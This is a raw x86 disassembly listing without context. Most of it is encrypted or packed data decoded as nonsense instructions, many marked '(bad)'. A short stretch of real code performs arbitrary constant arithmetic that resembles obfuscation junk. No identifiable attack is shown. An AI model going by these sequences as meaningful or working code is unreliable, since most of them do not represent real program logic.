  4149a5:	jnp    0x41499f
  4149a7:	out    0xe,al
  4149a9:	pushf  
  4149aa:	(bad)  
  4149ac:	mov    ecx,0x994a9b5f
  4149b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b2:	xor    eax,0x4312de52
  4149b7:	push   cs
  4149b8:	out    dx,eax
  4149b9:	aaa    
  4149ba:	aam    0x1b
  4149bc:	lock das 
  4149be:	ret    0x7b16
  4149c1:	adc    eax,0x16ae9b2f
  4149c6:	fs inc ecx
  4149c8:	mov    ds:0x2983db30,al
  4149cd:	dec    esi
  4149ce:	mov    ebx,DWORD PTR [ebx+eax*4-0x7a]
  4149d2:	add    al,0xe0
  4149d4:	or     dh,ah
  4149d6:	aam    0xd7
  4149d8:	adc    al,0x4a
  4149da:	mov    esp,0x56882408
  4149df:	and    DWORD PTR [eax],0x43dae941
  4149e5:	ins    DWORD PTR es:[edi],dx
  4149e6:	dec    edi
  4149e7:	std    
  4149e8:	xor    DWORD PTR [eax+0x4ea62601],edx
  4149ee:	outs   dx,DWORD PTR ds:[esi]
  4149ef:	fdivr  st(5),st
  4149f1:	dec    edi
  4149f2:	out    dx,eax
  4149f3:	jg     0x414a68
  4149f5:	adc    ah,BYTE PTR gs:[esi+0x44f2a37e]
  4149fc:	ret    0x9087
  4149ff:	in     al,0x5
  414a01:	mov    ch,0x30
  414a03:	jbe    0x4149ea
  414a05:	repnz sub bh,bl
  414a08:	pushf  
  414a09:	ficomp DWORD PTR [edi-0xf]
  414a0c:	mov    bh,0xe6
  414a0e:	out    dx,eax
  414a0f:	sub    al,0x2e
  414a11:	lods   eax,DWORD PTR ds:[esi]
  414a12:	inc    esp
  414a13:	pop    esp
  414a14:	outs   dx,DWORD PTR ds:[esi]
  414a15:	pop    ebp
  414a16:	dec    edx
  414a17:	sbb    BYTE PTR [ebx+eax*4],ch
  414a1a:	shr    DWORD PTR [ecx+ecx*2+0x27],1
  414a1e:	cli    
  414a1f:	jb     0x414a5c
  414a21:	sub    eax,0x41878c6
  414a26:	push   0xffffffe7
  414a28:	out    dx,al
  414a29:	push   eax
  414a2a:	cwde   
  414a2b:	into   
  414a2c:	mov    edi,0xf0c92581
  414a31:	adc    eax,0x881ae636
  414a36:	push   ecx
  414a37:	sub    al,0x18
  414a39:	popa   
  414a3a:	lods   eax,DWORD PTR ds:[esi]
  414a3b:	add    eax,0x46abadca
  414a40:	xchg   esi,eax
  414a41:	fld    TBYTE PTR [edi-0x3845a212]
  414a47:	mov    ecx,0x8679fe47
  414a4c:	aam    0x71
  414a4e:	pop    es
  414a4f:	and    BYTE PTR [esi-0x2a],ah
  414a52:	stos   BYTE PTR es:[edi],al
  414a53:	leave  
  414a54:	jmp    0x414ac8
  414a56:	mov    al,ds:0x9aa9b738
  414a5b:	cmp    eax,0x1360a829
  414a60:	sahf   
  414a61:	push   ss
  414a62:	push   esi
  414a63:	js     0x414a1c
  414a65:	rcl    BYTE PTR [esi-0x29],cl
  414a68:	sbb    al,0x45
  414a6a:	in     al,0x90
  414a6c:	std    
  414a6d:	inc    eax
  414a6e:	add    ebp,DWORD PTR [ebp+esi*4-0x3a7d3c50]
  414a75:	into   
  414a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a77:	pop    ebp
  414a78:	ret    0xca63
  414a7b:	sahf   
  414a7c:	or     esi,ebp
  414a7e:	mov    ecx,0x6fed0c46
  414a83:	cmp    BYTE PTR [edi-0x3e4403cd],bh
  414a89:	neg    esi
  414a8b:	call   0xfabc238c
  414a90:	hlt    
  414a91:	inc    esp
  414a92:	or     ch,bl
  414a94:	xor    eax,0x4cd39723
  414a99:	mul    DWORD PTR [eax-0x65961d90]
  414a9f:	fdiv   QWORD PTR [esi+0xb]
  414aa2:	sub    ebx,ebx
  414aa4:	scas   eax,DWORD PTR es:[edi]
  414aa5:	jge    0x414a5f
  414aa7:	inc    edi
  414aa8:	xchg   esp,eax
  414aa9:	add    BYTE PTR [edi],cl
  414aab:	shl    DWORD PTR [ebx-0x32c9d39a],0xe2
  414ab2:	sbb    eax,0x609fb098
  414ab7:	jmp    0x1f8a:0x6421df8b
  414abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414abf:	add    DWORD PTR [eax-0x42],esi
  414ac2:	dec    eax
  414ac3:	mov    dl,0x74
  414ac5:	jne    0x414b3d
  414ac7:	dec    edx
  414ac8:	add    cl,al
  414aca:	ins    BYTE PTR es:[edi],dx
  414acb:	sbb    al,0xf1
  414acd:	jmp    0x3d6ccb34
  414ad2:	adc    DWORD PTR [esi],0xffffffff
  414ad5:	data16 mov dl,bl
  414ad8:	inc    ebx
  414ad9:	push   ecx
  414ada:	sahf   
  414adb:	and    eax,0xc01259ec
  414ae0:	mov    bh,0x5a
  414ae2:	(bad)  
  414ae3:	push   edx
  414ae4:	jmp    0xece308e2
  414ae9:	push   0x58
  414aeb:	push   edi
  414aec:	(bad)  
  414aee:	xchg   ecx,eax
  414aef:	pop    esi
  414af0:	mov    edx,0xd054fadc
  414af5:	mov    BYTE PTR [eax+0x50],cl
  414af8:	(bad)  
  414af9:	frstor [eax]
  414afb:	xchg   DWORD PTR [ebx],esp
  414afd:	js     0x414afd
  414aff:	in     al,dx
  414b00:	and    al,0x1d
  414b02:	lahf   
  414b03:	test   BYTE PTR [ecx],al
  414b05:	dec    esp
  414b06:	pop    eax
  414b07:	popa   
  414b08:	and    ebx,edx
  414b0a:	call   FWORD PTR [edx]
  414b0c:	mov    esi,0xb3f62f16
  414b11:	pop    ss
  414b12:	pushf  
  414b13:	mov    esi,0xbdd16f41
  414b18:	mov    edi,0xd24596a
  414b1d:	jge    0x414ac9
  414b1f:	dec    esp
  414b20:	pop    ebp
  414b21:	dec    ebx
  414b22:	ss fcmovnb st,st(7)
  414b25:	scas   eax,DWORD PTR es:[edi]
  414b26:	inc    ecx
  414b27:	cmp    esp,0x56
  414b2a:	mov    ds:0xced281f5,al
  414b2f:	jmp    0x414b6c
  414b31:	jmp    0x682c:0x53854db0
  414b38:	mov    ebp,0x5fc0b77a
  414b3d:	rcr    DWORD PTR [ecx+eiz*1-0x60a82c8e],1
  414b44:	test   eax,0xa7beac15
  414b49:	or     ah,BYTE PTR [ebp+edx*2+0x18]
  414b4d:	(bad)  
  414b4e:	mov    bh,0x68
  414b50:	(bad)  
  414b51:	imul   ebx,DWORD PTR [ecx-0x2ae4dc20],0x3f
  414b58:	bound  edi,QWORD PTR [esi-0x3e819e96]
  414b5e:	adc    bh,BYTE PTR [edi+0x483123a9]
  414b64:	and    BYTE PTR cs:[eax+0x21],dl
  414b68:	mov    ch,0xc1
  414b6a:	imul   edi,DWORD PTR [ebx+0x0],0x36fc412
  414b71:	clc    
  414b72:	xor    bh,BYTE PTR [ecx+edi*4+0x35ab6604]
  414b79:	lock pop ecx
  414b7b:	mov    ch,0xa3
  414b7d:	arpl   WORD PTR [eax-0x6ec8aa80],bp
  414b83:	and    bh,BYTE PTR [ebx+0x1b6f4dba]
  414b89:	gs sbb al,0x65
  414b8c:	mov    eax,0xb2fa2349
  414b91:	pop    ebx
  414b92:	inc    ebp
  414b93:	ins    DWORD PTR es:[edi],dx
  414b94:	add    edi,DWORD PTR [ebp-0x1dbd06c4]
  414b9a:	ss jecxz 0x414b8a
  414b9d:	mov    edx,0x4fc68b1a
  414ba2:	int    0x40
  414ba4:	sbb    bl,BYTE PTR [eax+0x7]
  414ba7:	mov    eax,esi
  414ba9:	outs   dx,DWORD PTR ds:[esi]
  414baa:	int    0x6
  414bac:	call   0xacdd:0xa2945887
  414bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb4:	in     al,0x0
  414bb6:	je     0x414b71
  414bb8:	std    
  414bb9:	test   BYTE PTR [ecx+0x39],ah
  414bbc:	jmp    FWORD PTR [edx+ebx*1+0x5b6ff27c]
  414bc3:	dec    edi
  414bc4:	mov    al,0x80
  414bc6:	inc    esi
  414bc7:	cmp    dh,BYTE PTR [ebp+0x47f9ca67]
  414bcd:	xor    eax,0x25cf1ac3
  414bd2:	faddp  st(7),st
  414bd4:	xchg   esp,eax
  414bd5:	in     al,0x8b
  414bd7:	retf   
  414bd8:	ret    
  414bd9:	icebp  
  414bda:	inc    eax
  414bdb:	loop   0x414c54
  414bdd:	jmp    0x414c3f
  414bdf:	dec    ebx
  414be0:	push   eax
  414be1:	js     0x414ba0
  414be3:	inc    eax
  414be4:	mov    WORD PTR [ebx+0x5],cs
  414be7:	outs   dx,BYTE PTR ds:[esi]
  414be8:	scas   eax,DWORD PTR es:[edi]
  414be9:	xchg   esi,eax
  414bea:	xor    BYTE PTR [ebx-0x66d25ce8],ch
  414bf0:	test   eax,0x3a610c5d
  414bf5:	pop    ebp
  414bf6:	push   ebx
  414bf7:	clc    
  414bf8:	xor    ecx,esp
  414bfa:	(bad)  
  414bfb:	fist   DWORD PTR [esi]
  414bfd:	rcl    BYTE PTR [eax+ebx*1-0x64],cl
  414c01:	dec    edx
  414c02:	inc    ebx
  414c03:	mov    ebx,0x48d5285a
  414c08:	rcl    DWORD PTR [edx-0x61],1
  414c0b:	and    eax,0x97dd921
  414c10:	or     dh,ah
  414c12:	mov    BYTE PTR es:[eax-0x597f9d81],dl
  414c19:	stos   BYTE PTR es:[edi],al
  414c1a:	test   edi,ebx
  414c1c:	sub    eax,0xd1857750
  414c21:	pop    esi
  414c22:	into   
  414c23:	push   ebx
  414c24:	jbe    0x414c35
  414c26:	stos   BYTE PTR es:[edi],al
  414c27:	in     al,0x36
  414c29:	mov    al,fs:0xceb34310
  414c2f:	(bad)  
  414c30:	cld    
  414c31:	add    BYTE PTR ds:0xfb2dae84,0xa1
  414c38:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c3a:	dec    esp
  414c3b:	pop    edi
  414c3c:	or     edi,DWORD PTR [edi+edi*8]
  414c3f:	ss mov ecx,0xdddf2b7c
  414c45:	fidiv  WORD PTR [esi-0x649462f3]
  414c4b:	mov    ds:0x690a635e,eax
  414c50:	mov    ebp,0x9a287dfa
  414c55:	xor    ecx,eax
  414c57:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414c59:	pop    esi
  414c5a:	(bad)  
  414c5b:	adc    BYTE PTR [ecx+0x65],cl
  414c5e:	and    BYTE PTR [esi+0x43107baa],dl
  414c64:	sbb    dl,BYTE PTR [ebp+0x2c8475f3]
  414c6a:	mov    BYTE PTR [ebp-0xc484400],dh
  414c70:	aas    
  414c71:	add    al,dl
  414c73:	enter  0x552,0xeb
  414c77:	cwde   
  414c78:	mov    al,0xe6
  414c7a:	push   esi
  414c7b:	mov    esp,0xac9bb33d
  414c80:	aad    0x98
  414c82:	lahf   
  414c83:	mov    al,0xae
  414c85:	lods   eax,DWORD PTR ds:[esi]
  414c86:	bound  esp,QWORD PTR [edx]
  414c88:	adc    eax,0xa8a211bc
  414c8d:	leave  
  414c8e:	inc    edi
  414c8f:	mov    ah,0x82
  414c91:	pop    esp
  414c92:	mov    cl,al
  414c94:	inc    ebp
  414c95:	add    bh,BYTE PTR [edi+0x52]
  414c98:	sub    DWORD PTR [ebx+ecx*2-0x114e9272],edx
  414c9f:	mov    fs,WORD PTR [esi+0x4ade9da5]
  414ca5:	xchg   ebx,eax
  414ca6:	xor    dh,BYTE PTR [eax+0x76]
  414ca9:	iret   
  414caa:	xadd   DWORD PTR [ecx],edi
  414cad:	out    dx,eax
  414cae:	and    ch,BYTE PTR [ebx]
  414cb0:	imul   eax,DWORD PTR [esp+eax*4-0x2a],0x3
  414cb5:	in     eax,dx
  414cb6:	repnz cmp ebp,ebp
  414cb9:	ja     0x414c98
  414cbb:	je     0x414d17
  414cbd:	dec    edi
  414cbe:	sub    esp,ebx
  414cc0:	cwde   
  414cc1:	fisttp WORD PTR [edi+0x26082452]
  414cc7:	repnz cdq 
  414cc9:	cmp    al,0x4a
  414ccb:	fstp   QWORD PTR [ecx]
  414ccd:	or     esi,DWORD PTR ds:0x8c2bb3b0
  414cd3:	jmp    0x23ef7f67
  414cd8:	add    esp,DWORD PTR [edi+0x3a850c43]
  414cde:	shr    DWORD PTR [ecx-0x1d295738],cl
  414ce4:	stos   DWORD PTR es:[edi],eax
  414ce5:	pop    ecx
  414ce6:	out    0x85,eax
  414ce8:	add    al,0x94
  414cea:	cmp    eax,0xc97d3cf2
  414cef:	or     BYTE PTR [ebp-0x1774f1b8],bh
  414cf5:	leave  
  414cf6:	ret    0xafa8
  414cf9:	rcl    edx,1
  414cfb:	mov    ds:0x129453d7,al
  414d00:	cmc    
  414d01:	jecxz  0x414d3e
  414d03:	(bad)  [eiz*2-0x450c3d6f]
  414d0a:	lahf   
  414d0b:	rcl    BYTE PTR [esi+ecx*1-0x559895bc],0xf2
  414d13:	pop    esi
  414d14:	jae    0x414cda
  414d16:	and    edi,esp
  414d18:	icebp  
  414d19:	arpl   WORD PTR [ebp+ebp*1+0x5b],di
  414d1d:	stos   BYTE PTR es:[edi],al
  414d1e:	xchg   ebx,eax
  414d1f:	and    BYTE PTR [ecx],dh
  414d21:	dec    ecx
  414d22:	mov    esi,0xc8a67552
  414d27:	jge    0x414cc9
  414d29:	inc    esp
  414d2a:	and    edi,DWORD PTR [edi]
  414d2c:	cmp    eax,0x14fd07f2
  414d31:	push   es
  414d32:	or     DWORD PTR [eax-0x2b3e3f1b],ecx
  414d38:	sbb    BYTE PTR [esi+0x4d95ab41],0x6
  414d3f:	mov    edx,0x6e8b3fc4
  414d44:	retf   0x7053
  414d47:	jl     0x414cf5
  414d49:	add    eax,ecx
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0x39
  414e02:	jge    0x414e6f
  414e04:	mov    al,0x42
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx+0x41181812],dl
  414e0e:	retf   0x2f63
  414e11:	call   0xb8d84e53
  414e16:	mov    es,esp
  414e18:	jmp    0x1973:0x3607296b
  414e1f:	xchg   edx,eax
  414e20:	xchg   DWORD PTR [ebp+0x7e59168],ecx
  414e26:	adc    eax,0xdd198276
  414e2b:	scas   al,BYTE PTR es:[edi]
  414e2c:	mov    ds:0xaf5ef6c3,eax
  414e31:	mov    WORD PTR [edx+0x62eec23f],?
  414e37:	dec    ebp
  414e38:	mov    ch,0x93
  414e3a:	push   eax
  414e3b:	xchg   ebp,eax
  414e3c:	or     eax,DWORD PTR [edi+esi*2]
  414e3f:	lock fwait
  414e41:	jb     0x414eb3
  414e43:	int3   
  414e44:	ficom  DWORD PTR [esi]
  414e46:	sbb    al,0x90
  414e48:	cli    
  414e49:	xchg   ebx,eax
  414e4a:	fst    QWORD PTR [ecx]
  414e4c:	icebp  
  414e4d:	inc    ebx
  414e4e:	jo     0x414e57
  414e50:	push   eax
  414e51:	fwait
  414e52:	dec    ebp
  414e53:	mov    dh,0xcd
  414e55:	push   ss
  414e56:	in     al,0xb0
  414e58:	mov    bh,0xfe
  414e5a:	dec    esi
  414e5b:	jnp    0x414e9d
  414e5d:	push   esi
  414e5e:	jno    0x414e3c
  414e60:	mov    fs,WORD PTR [edx+eax*2]
  414e63:	xor    esp,DWORD PTR [ecx+0x6b790a1e]
  414e69:	xor    edi,DWORD PTR [ecx]
  414e6b:	stos   DWORD PTR es:[edi],eax
  414e6c:	inc    ebx
  414e6d:	xor    edx,ecx
  414e6f:	ret    
  414e70:	jbe    0x414edd
  414e72:	sbb    eax,0x4cd914cf
  414e77:	sub    BYTE PTR [ecx+0x4652d78c],al
  414e7d:	or     eax,esp
  414e7f:	push   ebx
  414e80:	mov    bh,0x4c
  414e82:	in     eax,0xba
  414e84:	cli    
  414e85:	mov    bl,0xb2
  414e87:	xchg   edx,eax
  414e88:	sar    BYTE PTR [ebx+0x5cd73c5],0x92
  414e8f:	int3   
  414e90:	fnsave [edx]
  414e92:	gs jle 0x414e3c
  414e95:	rol    ah,cl
  414e97:	fidivr WORD PTR [edx+esi*1+0x2be1ca21]
  414e9e:	stc    
  414e9f:	xlat   BYTE PTR ds:[ebx]
  414ea0:	pop    ds
  414ea1:	mov    WORD PTR [ebx+0x34eb5289],?
  414ea7:	popf   
  414ea8:	ret    
  414ea9:	jecxz  0x414ef6
  414eab:	mov    bl,0x2e
  414ead:	shr    DWORD PTR [esp+esi*2+0x4267df7c],0x33
  414eb5:	xor    esp,edx
  414eb7:	fneni(8087 only) 
  414eb9:	adc    ch,BYTE PTR [ecx]
  414ebb:	popf   
  414ebc:	(bad)  
  414ebd:	push   esi
  414ebe:	dec    ecx
  414ebf:	dec    esi
  414ec0:	mov    ebp,0xd292ad67
  414ec5:	or     eax,0x1294434c
  414eca:	jg     0x414e5f
  414ecc:	dec    esi
  414ecd:	loope  0x414eaf
  414ecf:	lds    esp,FWORD PTR [edi+0x794e12a0]
  414ed5:	leave  
  414ed6:	mov    ah,0x38
  414ed8:	push   0xffffffb6
  414eda:	outs   dx,BYTE PTR ds:[esi]
  414edb:	add    al,0xaf
  414edd:	js     0x414ed9
  414edf:	je     0x414f0e
  414ee1:	les    eax,FWORD PTR [edi+0x256e190]
  414ee7:	pop    ebx
  414ee8:	adc    eax,esi
  414eea:	pusha  
  414eeb:	mov    dl,0xa9
  414eed:	in     al,dx
  414eee:	ins    BYTE PTR es:[edi],dx
  414eef:	mov    es,WORD PTR [ebx-0x795ad9f2]
  414ef5:	mov    dh,0xa4
  414ef7:	add    esi,ebp
  414ef9:	mov    eax,ds:0xbcfe1b9c
  414efe:	mov    cs,eax
  414f00:	add    BYTE PTR [edi+0x6e3411c2],bl
  414f06:	push   esi
  414f07:	mov    ecx,0xb53c305c
  414f0c:	mov    WORD PTR [ebx],ds
  414f0e:	mov    ebx,0x788772f3
  414f13:	(bad)  
  414f15:	and    eax,0xf47ff393
  414f1a:	mov    bh,0x4f
  414f1c:	mov    WORD PTR [edi],ss
  414f1e:	int3   
  414f1f:	sbb    DWORD PTR [edx-0x12f4d41b],ecx
  414f25:	pushf  
  414f26:	push   edi
  414f27:	xchg   DWORD PTR [ebx+ebx*1+0x328a197],esi
  414f2e:	addr16 dec esp
  414f30:	cmp    al,dh
  414f32:	dec    ebp
  414f33:	enter  0x5027,0x64
  414f37:	add    ch,bh
  414f39:	pusha  
  414f3a:	push   0xe4c5e819
  414f3f:	leave  
  414f40:	call   0xadf5:0x97816e0
  414f47:	addr16 pushf 
  414f49:	enter  0x2372,0x27
  414f4d:	dec    eax
  414f4e:	sub    eax,0x18d991ce
  414f53:	test   eax,0xc71de436
  414f58:	popw   fs
  414f5b:	pop    ds
  414f5c:	add    BYTE PTR ds:0x1677a1fc,dl
  414f62:	xor    BYTE PTR [edx],ch
  414f64:	stos   BYTE PTR es:[edi],al
  414f65:	pop    es
  414f66:	push   cs
  414f67:	jmp    0xcc13d7f6
  414f6c:	popf   
  414f6d:	jns    0x414f8b
  414f6f:	dec    esi
  414f70:	stos   DWORD PTR es:[edi],eax
  414f71:	int3   
  414f72:	inc    ebp
  414f73:	and    bl,BYTE PTR [ebp+0x1434a2cc]
  414f79:	sbb    esi,edx
  414f7b:	push   esp
  414f7c:	in     eax,0x4c
  414f7e:	popf   
  414f7f:	rcr    cl,cl
  414f81:	xchg   BYTE PTR [eax-0x4c8efbca],ah
  414f87:	add    al,0x3
  414f89:	sub    eax,0x45510405
  414f8e:	or     al,0x5d
  414f90:	bound  esp,QWORD PTR [esi+0x47]
  414f93:	std    
  414f94:	sahf   
  414f95:	cli    
  414f96:	bound  ebx,QWORD PTR [esi]
  414f98:	icebp  
  414f99:	leave  
  414f9a:	(bad)  
  414f9b:	pop    ds
  414f9c:	sub    BYTE PTR [ebx+0x690dabbd],ch
  414fa2:	popf   
  414fa3:	mov    ch,0xb2
  414fa5:	add    ch,bl
  414fa7:	sbb    eax,0xa455c82e
  414fac:	jg     0x414f41
  414fae:	fnstenv [ecx+0xdd87621]
  414fb4:	scas   eax,DWORD PTR es:[edi]
  414fb5:	and    al,0x2d
  414fb7:	bound  ebp,QWORD PTR [edi-0x3e9bb1da]
  414fbd:	add    edi,DWORD PTR fs:[edx+0x1]
  414fc1:	aam    0xba
  414fc3:	mov    WORD PTR [edx+0x5e055b86],?
  414fc9:	lock fild QWORD PTR [eax]
  414fcc:	cli    
  414fcd:	sbb    ebp,DWORD PTR [edi+eax*2+0x55248ec]
  414fd4:	dec    sp
  414fd6:	push   es
  414fd7:	scas   eax,DWORD PTR es:[edi]
  414fd8:	mov    edi,0xb8a368ba
  414fdd:	ss ins DWORD PTR es:[edi],dx
  414fdf:	out    dx,al
  414fe0:	mov    edi,0xa316e7ad
  414fe5:	shl    edi,cl
  414fe7:	pushf  
  414fe8:	ds xchg ecx,eax
  414fea:	aad    0x4
  414fec:	mov    ah,0x12
  414fee:	aaa    
  414fef:	dec    eax
  414ff0:	mov    cl,dh
  414ff2:	ror    ebp,0xd5
  414ff5:	mov    edi,0x6b342a3d
  414ffa:	loope  0x414ff8
  414ffc:	enter  0xe672,0x1e
  415000:	pop    edi
  415001:	dec    ecx
  415002:	stc    
  415003:	push   ebx
  415004:	pop    ds
  415005:	out    dx,al
  415006:	add    DWORD PTR [eax],eax
  415008:	pop    esi
  415009:	(bad)  
  41500b:	push   edx
  41500c:	out    dx,al
  41500d:	xchg   esp,eax
  41500e:	aas    
  41500f:	aaa    
  415010:	stc    
  415011:	sbb    al,0x39
  415013:	imul   BYTE PTR [ebx+0x32]
  415016:	outs   dx,DWORD PTR ds:[esi]
  415017:	lea    esp,[edx]
  415019:	fistp  WORD PTR [ecx-0x303c158a]
  41501f:	pop    es
  415020:	jmp    0x415055
  415022:	cmp    eax,0xa78e7a6a
  415027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415028:	xchg   esi,eax
  415029:	lds    ebx,FWORD PTR [ebp+0x4685539f]
  41502f:	call   0xc3e9791d
  415034:	pop    edi
  415035:	test   DWORD PTR [ebp-0x19e67954],ebx
  41503b:	mov    fs,WORD PTR [esi+0x7eb6557]
  415041:	mov    ecx,0x8f6a6af5
  415046:	mov    ch,0xb1
  415048:	pop    esi
  415049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41504a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41504b:	loop   0x4150a6
  41504d:	sub    DWORD PTR [ecx+0x1508df3b],esp
  415053:	inc    edx
  415054:	and    esp,ebp
  415056:	cs pop ebp
  415058:	ds mov dl,0x6
  41505b:	jmp    0x1995ac9b
  415060:	ja     0x4150ae
  415062:	les    ebp,FWORD PTR [edx+0x4c66cff9]
  415068:	out    dx,eax
  415069:	dec    ecx
  41506a:	sub    bl,BYTE PTR [ecx-0x29ec3d2f]
  415070:	cmp    BYTE PTR [edx+0x24458dc8],bh
  415076:	adc    DWORD PTR [esi+edx*2-0x40bdd197],0x3ab67788
  415081:	pop    ss
  415082:	dec    eax
  415083:	cwde   
  415084:	or     dh,dh
  415086:	repnz mov ds:0xda3c9bab,al
  41508c:	aas    
  41508d:	cmp    dl,al
  41508f:	loope  0x4150b9
  415091:	dec    esi
  415092:	(bad)  
  415093:	(bad)  
  415094:	in     eax,dx
  415095:	(bad)  
  415096:	idiv   BYTE PTR [edi]
  415098:	gs in  eax,dx
  41509a:	cmp    al,bl
  41509c:	xor    DWORD PTR [ebx],0x539d6ebc
  4150a2:	rol    DWORD PTR [edi],0x3e
  4150a5:	bound  esi,QWORD PTR [eax+edx*8]
  4150a8:	mov    edx,0x6f44d5dc
  4150ad:	xor    ch,BYTE PTR [ebx-0x75]
  4150b0:	fidivr WORD PTR [edx]
  4150b2:	mov    edx,0xbb79f3b4
  4150b7:	int3   
  4150b8:	adc    BYTE PTR [ecx],0x30
  4150bb:	pop    edx
  4150bc:	mov    ch,0x8f
  4150be:	sub    BYTE PTR [edx+eax*2+0x4deae46a],cl
  4150c5:	fild   WORD PTR [esi]
  4150c7:	nop
  4150c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c9:	mov    ch,0x3f
  4150cb:	jmp    DWORD PTR [edx-0x24]
  4150ce:	jne    0x41508c
  4150d0:	out    dx,al
  4150d1:	add    cl,BYTE PTR [edx-0x3f]
  4150d4:	xchg   ebp,eax
  4150d5:	aam    0xae
  4150d7:	pop    esp
  4150d8:	mov    dl,0x9e
  4150da:	xchg   ebx,eax
  4150db:	cwde   
  4150dc:	push   esp
  4150dd:	or     eax,edi
  4150df:	test   ebx,edi
  4150e1:	push   edx
  4150e2:	sbb    ah,0xf2
  4150e5:	loopne 0x41506b
  4150e7:	and    al,0x32
  4150e9:	dec    edi
  4150ea:	xor    dh,BYTE PTR [esi+0x1a]
  4150ed:	imul   eax,DWORD PTR [esi+0x45fb4b66],0x14c94eb
  4150f7:	in     al,dx
  4150f8:	arpl   WORD PTR [ebx+edx*4-0x36],bp
  4150fc:	int    0xd8
  4150fe:	mov    BYTE PTR [edi+eiz*8+0x4f],dl
  415102:	xchg   edi,eax
  415103:	add    al,0xb9
  415105:	pop    ecx
  415106:	outs   dx,BYTE PTR ds:[esi]
  415107:	mov    eax,ds:0x83b0441d
  41510c:	jo     0x41517c
  41510e:	arpl   WORD PTR [edi+0x1045d7b],sp
  415114:	cmp    al,0x25
  415116:	inc    esi
  415117:	mov    ebp,0xc17ffc75
  41511c:	sbb    ebp,DWORD PTR [edx+0x79202dd9]
  415122:	in     al,0xb4
  415124:	or     BYTE PTR [esi-0x23],ah
  415127:	rcr    ebx,0xd1
  41512a:	fistp  QWORD PTR [eax+0x29f6d003]
  415130:	mov    bh,0x3f
  415132:	sub    al,0xd2
  415134:	scas   eax,DWORD PTR es:[edi]
  415135:	or     BYTE PTR [edx],bh
  415137:	fidivr DWORD PTR ds:0x9e05f8ca
  41513d:	ds adc eax,0x2ec9dfb1
  415143:	stc    
  415144:	lock data16 fsubr DWORD PTR [ecx]
  415148:	imul   ecx,DWORD PTR [ecx-0x45]
  41514c:	mov    ecx,ecx
  41514e:	in     al,dx
  41514f:	scas   eax,DWORD PTR es:[edi]
  415150:	pop    ecx
  415151:	outs   dx,DWORD PTR ds:[esi]
  415152:	pop    ds
  415153:	cli    
  415154:	jne    0x4150f8
  415156:	push   cs
  415157:	sahf   
  415158:	stc    
  415159:	sahf   
  41515a:	add    eax,ecx
  41515c:	jge    0x41516f
  41515e:	jecxz  0x4150ec
  415160:	pusha  
  415161:	das    
  415162:	mov    ds:0xcbf4ce2b,eax
  415167:	inc    esi
  415168:	adc    eax,0x6e096a9a
  41516d:	stos   DWORD PTR es:[edi],eax
  41516e:	jg     0x415189
  415170:	sub    esi,ebp
  415172:	add    al,0x4c
  415174:	sti    
  415175:	aad    0x80
  415177:	xchg   edi,eax
  415178:	rcr    BYTE PTR [eax+0x18],1
  41517b:	popf   
  41517c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41517d:	aaa    
  41517e:	js     0x415121
  415180:	mov    WORD PTR [esi+0x4300ca16],?
  415186:	repz push 0x2f121805
  41518c:	test   edx,edi
  41518e:	dec    edi
  41518f:	inc    ecx
  415190:	jecxz  0x4151b9
  415192:	push   esp
  415193:	arpl   WORD PTR [ebp+0x3e7b95f8],bp
  415199:	pop    ebp
  41519a:	pop    ecx
  41519b:	je     0x415136
  41519d:	es xchg ebx,eax
  41519f:	(bad)  
  4151a0:	out    dx,eax
  4151a1:	das    
  4151a2:	inc    ebx
  4151a3:	jbe    0x41514e
  4151a5:	dec    ebp
  4151a6:	ficomp WORD PTR [eax-0x77140793]
  4151ac:	fwait
